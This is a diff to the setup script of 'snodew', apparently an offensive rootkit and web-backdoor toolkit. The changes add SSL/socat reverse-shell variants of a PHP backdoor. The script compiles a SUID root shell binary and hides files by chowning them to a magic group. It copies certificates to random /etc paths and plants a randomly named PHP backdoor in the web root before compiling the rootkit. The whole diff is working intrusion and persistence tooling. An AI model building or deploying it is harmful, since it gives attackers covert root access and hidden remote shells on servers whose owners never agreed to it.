@@ -4,18 +4,45 @@
 WWWNAME="www-data"
 #WWWNAME="http"
 #WWWNAME="httpd"
-SECRET_PORT=""
 
-SNODEW_LOC="src/snodew.php"
+SECRET_PORT="" # if this is empty a random value is used instead
+
+# by default use socat.ssl.php. change if you want.
+# if using socat.ssl.php, you need to use src/gencert.sh first.
+SNODEW_LOC="src/snodew.socat.ssl.php"
+#SNODEW_LOC="src/snodew.socat.php"
+#SNODEW_LOC="src/snodew.ncat.php"
 
 [ -f .ascii ] && printf "\e[32m`cat .ascii`\e[0m" && echo
 
 secho(){ echo -e " [\e[32m+\e[0m] $1"; }
 eecho(){ echo -e " [\e[31m-\e[0m] $1"; }
 
+[[ "$SNODEW_LOC" == *"socat"* ]] && [ ! -f `which socat 2>/dev/null || echo 'nope'` ] && { \
+    eecho "you want to use socat for the reverse shell, but it's not installed."; \
+    eecho "install it, or use snodew.ncat.php instead"; \
+    exit; \
+}
+
+# if the user is using the ssl variant of the php scripts,
+# we need to check they've generated a certificate first.
+if [[ "$SNODEW_LOC" == *"ssl"* ]]; then
+    [ ! -f `which openssl 2>/dev/null || echo 'nope'` ] && { \
+        eecho "install openssl for $SNODEW_LOC"; \
+        exit; \
+    }
+
+    CLIENTPEM="./src/ssl/client.pem"
+    [ ! -f $CLIENTPEM ] && { eecho "$CLIENTPEM doesn't exist. have you used ./src/ssl/gencert.sh?"; exit; }
+    SERVERCRT="./src/ssl/server.crt"
+    [ ! -f $SERVERCRT ] && { eecho "$SERVERCRT doesn't exist. have you used ./src/ssl/gencert.sh?"; exit; }
+
+    DO_SSL=1 # everything is present, tell setup.sh to setup everything with ssl in mind
+fi
+
 [ -z $COMPILE_ONLY ] && [ `id -u` != 0 ] && { eecho "not root, exiting"; exit; }
 [ ! -f "$SNODEW_LOC" ] && { eecho "$SNODEW_LOC not found, exiting"; exit; }
-[ ! -f `which gcc 2>/dev/null || echo "no"` ] && { eecho "gcc not installed/found, exiting"; exit; }
+[ ! -f `which gcc 2>/dev/null || echo 'nope'` ] && { eecho "gcc not installed/found, exiting"; exit; }
 [ -z $NO_ROOTKIT ] && [ -z "`cat /etc/passwd | grep $WWWNAME`" ] && { \
     eecho "no passwd entry for $WWWNAME"; \
     exit; \
@@ -37,7 +64,7 @@ random(){ echo -n "`cat /dev/urandom | tr -dc $1 | fold -w $2 | head -n 1`"; }
 hash_password(){ echo -n "$(sed 's/.\{2\}$//' <<< $(echo `echo -n "$1" | md5sum`))"; }
 # usage: hide_file [path]
 hide_file(){
-    [ -z $NO_ROOTKIT ] && chown 0:$MAGIC_GID $1 2>/dev/null;
+    [ -z $NO_ROOTKIT ] && chown 0:$MAGIC_GID $1 2>/dev/null
 }
 
 get_userinfo(){ # $1 = username
@@ -51,7 +78,8 @@ get_userinfo(){ # $1 = username
 # compiles small program that runs /bin/sh after setting our gid to our magic gid.
 # then hides it & gives it suid permissions.
 setup_backdoor(){
-    printf "#include <unistd.h>\nint main(){setuid(0);setgid($MAGIC_GID);execl(\"/bin/sh\",\"sh\",0);return 0;}" > bd.c
+    # we interactive shell nao
+    printf "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0);setgid($MAGIC_GID);putenv(\"TERM=xterm\");printf(\"i'm fuckin gay lmao\\\n\");execl(\"/bin/bash\",\"bash\",\"-li\",0);return 0;}" > bd.c
 
     echo " [..] compiling suid binary"
     gcc bd.c -o $1 || { eecho "couldn't compile binary"; exit; }
@@ -71,7 +99,26 @@ config_snodew(){
     cp $SNODEW_LOC ${SNODEW_LOC}.bak
     sed -i "s:_PASS_:$1:" $SNODEW_LOC
     sed -i "s:_SUID_BIN_:$2:" $SNODEW_LOC
+    sed -i "s:_MAGIC_VAR_:$MAGIC_VAR:" $SNODEW_LOC
     sed -i "s:_SECRET_PORT_:$SECRET_PORT:" $SNODEW_LOC
+
+    if [ ! -z $DO_SSL ]; then   # first, copy cert somewhere & hide it
+        secho "setting up ssl cert for the backdoor"
+
+        NCLIENTPEM="/etc/`random 'a-z' 6`.pem"
+        NSERVERCRT="/etc/`random 'a-z' 6`.crt"
+
+        [ -z $COMPILE_ONLY ] && cp $CLIENTPEM $NCLIENTPEM
+        [ -z $COMPILE_ONLY ] && cp $SERVERCRT $NSERVERCRT
+        hide_file $NCLIENTPEM
+        hide_file $NSERVERCRT
+
+        secho "files copied & hidden successfully"
+        secho "writing new cert paths to $SNODEW_LOC"
+        sed -i "s:_SERVERCRTPATH_:$NSERVERCRT:" $SNODEW_LOC
+        sed -i "s:_CLIENTPEMPATH_:$NCLIENTPEM:" $SNODEW_LOC
+        secho "done configuring ssl settings"
+    fi
 
     PHP_NEWFILENAME="`random 'a-z' 6`.php"
     PHP_LOCATION="$3/$PHP_NEWFILENAME"
@@ -129,6 +176,12 @@ sed -i "s:_WWWUID_:$WWWUID:" $CONF_H
 sed -i "s:_WWWGID_:$WWWGID:" $CONF_H
 sed -i "s:_WWWNAME_:$WWWNAME:" $CONF_H
 sed -i "s:_WWWHOME_:$WWWHOME:" $CONF_H
+
+if [ ! -z $DO_SSL ]; then
+    secho "writing ssl cert paths to rootkit header file"
+    echo "#define CLIENTPEM \"$NCLIENTPEM\"" >> $CONF_H
+    echo "#define SERVERCRT \"$NSERVERCRT\"" >> $CONF_H
+fi
 
 echo " [..] compiling snodew's rootkit"
 
